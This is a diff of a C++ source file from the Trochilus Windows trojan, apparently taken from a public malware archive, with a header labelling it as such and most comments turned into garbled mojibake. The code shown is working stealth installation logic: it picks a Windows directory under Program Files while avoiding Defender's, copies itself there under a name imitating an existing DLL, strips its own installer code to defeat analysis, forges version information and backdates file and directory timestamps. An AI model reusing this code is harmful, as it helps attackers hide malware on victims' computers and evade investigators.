@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <shlobj.h>
 #include <time.h>
@@ -11,7 +22,7 @@
 
 #define MYRAND(_base) ((int) ((double)rand() / (RAND_MAX + 1) * (_base)))
 
-//Ã¶¾ÙÄ¿Â¼
+//Ã¶ï¿½ï¿½Ä¿Â¼
 static BOOL EnumDir(LPCTSTR findstr, TStringVector& filenameList, LPCTSTR filterName = NULL)
 {
 	WIN32_FIND_DATA finddata = {0};
@@ -31,7 +42,7 @@ static BOOL EnumDir(LPCTSTR findstr, TStringVector& filenameList, LPCTSTR filter
 	return TRUE;
 }
 
-//ÔÚProgram filesÖÐÕÒµ½ºÏÊÊµÄÄ£·ÂµÄÎÄ¼þ
+//ï¿½ï¿½Program filesï¿½ï¿½ï¿½Òµï¿½ï¿½ï¿½ï¿½Êµï¿½Ä£ï¿½Âµï¿½ï¿½Ä¼ï¿½
 static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring& suitableFilename, LPCTSTR filterName, FILETIME* pCreationTime, FILETIME* pLastAccessTime, FILETIME* pLastWriteTime)
 {
 	CODE_MARK_BEGIN();
@@ -42,7 +53,7 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 		return FALSE;
 	}
 
-	//ÁÐ¾Ùprogram filesÄ¿Â¼ÏÂµÄËùÓÐ×ÓÄ¿Â¼
+	//ï¿½Ð¾ï¿½program filesÄ¿Â¼ï¿½Âµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼
 	TCHAR dirFindstr[MAX_PATH] = {0};
 	_stprintf_s(dirFindstr, _T("%s\\*."), pfFilepath);
 
@@ -53,21 +64,21 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 		return FALSE;
 	}
 
-	//Ã¶¾ÙËùÓÐ×ÓÄ¿Â¼£¬ÕÒ³öÒÔwindows¿ªÍ·µÄ£¬²¢ÇÒÄ¿Â¼ÏÂÃæ´æÔÚdllÎÄ¼þµÄÄ¿Â¼
+	//Ã¶ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½Ò³ï¿½ï¿½ï¿½windowsï¿½ï¿½Í·ï¿½Ä£ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½dllï¿½Ä¼ï¿½ï¿½ï¿½Ä¿Â¼
 	TStringVector::iterator dirIter = dirnameList.begin();
 	while (dirIter != dirnameList.end())
 	{
 		tstring dirname = *dirIter;
 		makeLower(dirname);
 
-		//Èç¹û²»ÊÇwindows×ÖÑù¿ªÍ·µÄÄ¿Â¼»òÕß°üº¬defender×ÖÑù£¬ÔòÌø¹ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½windowsï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í·ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ß°ï¿½ï¿½ï¿½defenderï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		if (dirname.find(_T("windows ")) != 0 || dirname.find(_T("defender")) != tstring::npos)
 		{
 			dirIter = dirnameList.erase(dirIter);
 			continue;
 		}
 
-		//ÔÚ×ÓÄ¿Â¼ÖÐ²éÕÒdllÎÄ¼þ£¬Èç¹û¸ÃÄ¿Â¼ÏÂÃ»ÓÐdllÎÄ¼þÔòÌø¹ý
+		//ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½Ð²ï¿½ï¿½ï¿½dllï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ã»ï¿½ï¿½dllï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		TCHAR dllFindstr[MAX_PATH] = {0};
 		_stprintf_s(dllFindstr, _T("%s\\%s\\*.dll"), pfFilepath, dirIter->c_str());
 
@@ -87,13 +98,13 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 		return FALSE;
 	}
 
-	//Ëæ»úÑ¡È¡Ò»¸öÄ¿Â¼
+	//ï¿½ï¿½ï¿½Ñ¡È¡Ò»ï¿½ï¿½Ä¿Â¼
 	srand((unsigned)time(NULL));
 	dirpath = pfFilepath;
 	dirpath += '\\';
 	dirpath += dirnameList[MYRAND(dirnameList.size())];
 
-	//Ñ¡È¡Ò»¸öÎÄ¼þÀ´Ä£·Â
+	//Ñ¡È¡Ò»ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ä£ï¿½ï¿½
 	TCHAR dllFindstr[MAX_PATH] = {0};
 	_stprintf_s(dllFindstr, _T("%s\\*.dll"), dirpath.c_str());
 	TStringVector dllfileList;
@@ -104,7 +115,7 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 	}
 	selectedDllFilename = dllfileList[MYRAND(dllfileList.size())];
 
-	//»ñÈ¡Ä£·ÂÎÄ¼þµÄÊ±¼ä
+	//ï¿½ï¿½È¡Ä£ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½Ê±ï¿½ï¿½
 	tstring selectedDllFilepath = dirpath;
 	selectedDllFilepath += '\\';
 	selectedDllFilepath += selectedDllFilename;
@@ -117,10 +128,10 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 	::GetFileTime(hFile, pCreationTime, pLastAccessTime, pLastWriteTime);
 	::CloseHandle(hFile);
 
-	//ÖÆ×÷ºÏÊÊµÄÃû³Æ
+	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Êµï¿½ï¿½ï¿½ï¿½ï¿½
 #define SUBNAME_COUNT 5
 	tstring::size_type pos = selectedDllFilename.find_last_of('.');
-	if (pos > 9) pos = 9;	//ÎÄ¼þÃû³Æ¼ÓÉÏsubnamesÖÐµÄºó×º£¬²»ÄÜ³¬¹ýservantshellµÄ³¤¶È¡£subnames×î³¤3¸ö×Ö·û£¬¹ÊÐè½ØÈ¡Ä£·ÂÎÄ¼þÃûµÄ9¸ö×Ö·û
+	if (pos > 9) pos = 9;	//ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½Æ¼ï¿½ï¿½ï¿½subnamesï¿½ÐµÄºï¿½×ºï¿½ï¿½ï¿½ï¿½ï¿½Ü³ï¿½ï¿½ï¿½servantshellï¿½Ä³ï¿½ï¿½È¡ï¿½subnamesï¿½î³¤3ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡Ä£ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½9ï¿½ï¿½ï¿½Ö·ï¿½
 	suitableFilename = selectedDllFilename.substr(0, pos);
 	LPCTSTR subnames[SUBNAME_COUNT] = {_T("2"), _T("upd"), _T("srv"), _T("svc"), _T("ldr")};
 	suitableFilename += subnames[MYRAND(SUBNAME_COUNT)];
@@ -130,7 +141,7 @@ static BOOL FindLocation(tstring& dirpath, tstring& selectedDllFilename, tstring
 	return TRUE;
 }
 
-//°æ±¾ÐÅÏ¢
+//ï¿½æ±¾ï¿½ï¿½Ï¢
 typedef struct VS_VERSIONINFO
 {
 	WORD                wLength;
@@ -182,7 +193,7 @@ typedef struct MY_VERSION_INFO
 	}
 } MY_VERSION_INFO;
 
-//»ñÈ¡peÎÄ¼þµÄ°æ±¾ÐÅÏ¢
+//ï¿½ï¿½È¡peï¿½Ä¼ï¿½ï¿½Ä°æ±¾ï¿½ï¿½Ï¢
 static BOOL GetMyVersionInfo(LPCTSTR filepath, MY_VERSION_INFO* pInfo)
 {
 	CODE_MARK_BEGIN();
@@ -223,7 +234,7 @@ static BOOL GetMyVersionInfo(LPCTSTR filepath, MY_VERSION_INFO* pInfo)
 	return TRUE;
 }
 
-//Î±Ôì°æ±¾ÐÅÏ¢
+//Î±ï¿½ï¿½æ±¾ï¿½ï¿½Ï¢
 static BOOL MakeFakeVersionInfo(LPCTSTR sourceFilepath, LPCTSTR targetFilepath, LPCTSTR targetFilename)
 {
 	CODE_MARK_BEGIN();
@@ -282,7 +293,7 @@ BOOL Camp(LPCTSTR currentFilepath, LPCTSTR dllFilename, tstring& dllFilepath)
 	dllFilepath = currentFilepath;
 	CODE_MARK_BEGIN();
 
-	//²éÕÒ²¢Éú³ÉÒ»¸öºÏÊÊµÄ°²·ÅÎÄ¼þÂ·¾¶
+	//ï¿½ï¿½ï¿½Ò²ï¿½ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ÊµÄ°ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Â·ï¿½ï¿½
 	tstring dirpath, suitableFilename, selectedDllFilename;
 	FILETIME ftCreationTime = {0}, ftLastAccessTime = {0}, ftLastWriteTime = {0};
 	if (! FindLocation(dirpath, selectedDllFilename, suitableFilename, dllFilename, &ftCreationTime, &ftLastAccessTime, &ftLastWriteTime))
@@ -298,11 +309,11 @@ BOOL Camp(LPCTSTR currentFilepath, LPCTSTR dllFilename, tstring& dllFilepath)
 
 	do 
 	{
-		//»ñÈ¡ËùÔÚÄ¿Â¼µÄÊ±¼äÊôÐÔ
+		//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		DECLARE_TIMES(dir);
 		GetFileTimes(dirpath.c_str(), TRUE, TIMES_PARAM(dir));
 		
-		//¶ÁÈ¡×ÔÉí
+		//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½
 		MyFile me;
 		if (! me.Open(currentFilepath, GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
 		{
@@ -318,10 +329,10 @@ BOOL Camp(LPCTSTR currentFilepath, LPCTSTR dllFilename, tstring& dllFilepath)
 
 		me.Close();
 
-		//ÇåÀíµô×îÖÕdllÖÐ¹ØÓÚChameleon²¿·Ö´úÂë£¬±ÜÃâ±»·ÖÎö³ö»ìÏý°²×°·½·¨
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½dllï¿½Ð¹ï¿½ï¿½ï¿½Chameleonï¿½ï¿½ï¿½Ö´ï¿½ï¿½ë£¬ï¿½ï¿½ï¿½â±»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×°ï¿½ï¿½ï¿½ï¿½
 		PEUtils::CleanCode((LPBYTE)fileContent);
 
-		//Ð´ÈëÄ¿±êÎ»ÖÃ
+		//Ð´ï¿½ï¿½Ä¿ï¿½ï¿½Î»ï¿½ï¿½
 		MyFile target;
 		if (! target.Open(targetDllFilepath.c_str(), GENERIC_WRITE, CREATE_ALWAYS, 0))
 		{
@@ -336,16 +347,16 @@ BOOL Camp(LPCTSTR currentFilepath, LPCTSTR dllFilename, tstring& dllFilepath)
 		}
 		target.Close();
 
-		//¸´ÖÆ°æ±¾ÐÅÏ¢
+		//ï¿½ï¿½ï¿½Æ°æ±¾ï¿½ï¿½Ï¢
 		tstring simFilepath = dirpath;
 		simFilepath += '\\';
 		simFilepath += selectedDllFilename;
 		MakeFakeVersionInfo(simFilepath.c_str(), targetDllFilepath.c_str(), suitableFilename.c_str());
 
-		//ÉèÖÃÎÄ¼þÊ±¼ä
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê±ï¿½ï¿½
 		SetFileTimes(targetDllFilepath.c_str(), FALSE, ftCreationTime, ftLastAccessTime, ftLastWriteTime);
 
-		//ÉèÖÃËùÔÚÄ¿Â¼µÄÊ±¼ä
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ê±ï¿½ï¿½
 		SetFileTimes(dirpath.c_str(), TRUE, TIMES_PARAM(dir));
 		
 		dllFilepath = targetDllFilepath;
